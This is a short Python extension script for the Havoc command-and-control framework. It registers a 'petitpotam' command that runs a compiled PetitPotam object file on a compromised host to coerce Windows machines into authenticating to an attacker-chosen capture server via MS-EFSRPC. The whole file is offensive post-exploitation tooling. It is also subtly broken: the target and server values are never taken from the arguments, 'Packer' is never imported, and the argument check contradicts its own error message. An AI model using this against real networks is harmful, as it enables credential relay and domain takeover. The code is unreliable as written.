from havoc import Demon, RegisterCommand
from struct import pack, calcsize

def petitpotam(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(param)
    target = ''
    capture_server = ''

    if num_params > 3 or num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Only accepts two parameters [Capture Server, Target]' )
        return False

    packer.addstr(target)
    packer.addstr(capture_server)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to coerce with PetitPotam")
    demon.InlineExecute( TaskID, "go", f"bin/PetitPotam.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand(petitpotam, "", "petitpotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC.", 0, "Capture Server", "Target")
